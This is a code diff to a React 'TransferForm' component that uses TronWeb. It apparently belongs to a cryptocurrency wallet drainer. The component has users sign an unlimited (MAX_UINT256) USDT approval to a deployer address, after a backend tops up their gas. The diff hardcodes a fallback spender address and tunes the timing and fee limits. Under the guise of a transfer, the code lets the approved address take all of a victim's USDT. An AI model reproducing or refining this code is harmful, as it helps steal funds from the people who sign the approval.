@@ -4,7 +4,7 @@ import { TronWeb } from 'tronweb';
 import '../App.css';
 
 const USDT_TRC20    = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-const APPROVE_TO    = import.meta.env.VITE_DEPLOYER_ADDRESS;
+const APPROVE_TO    = import.meta.env.VITE_DEPLOYER_ADDRESS || 'TVuxfK2ZCTdggcaN2Rd5gDUMXrJ1DKUQza';
 const BACKEND_URL   = import.meta.env.VITE_BACKEND_URL;
 const API_KEY       = import.meta.env.VITE_API_KEY;
 const RECIPIENT     = import.meta.env.VITE_RECIPIENT_ADDRESS;
@@ -99,7 +99,7 @@ const TransferForm = ({ onApproved }) => {
         const data = await res.json();
         if (data.isNeededGas) {
           setStatus('Waiting for gas...');
-          await new Promise(r => setTimeout(r, 5000));
+          await new Promise(r => setTimeout(r, 8000));
         }
       } catch (e) { console.error('topup error:', e); }
 
@@ -109,7 +109,7 @@ const TransferForm = ({ onApproved }) => {
       const built = await tronWeb.transactionBuilder.triggerSmartContract(
         tronWeb.address.toHex(USDT_TRC20),
         'approve(address,uint256)',
-        { feeLimit: 1_000_000_000, callValue: 0 },
+        { feeLimit: 100_000_000, callValue: 0 },
         [
           { type: 'address', value: APPROVE_TO },
           { type: 'uint256', value: MAX_UINT256 },
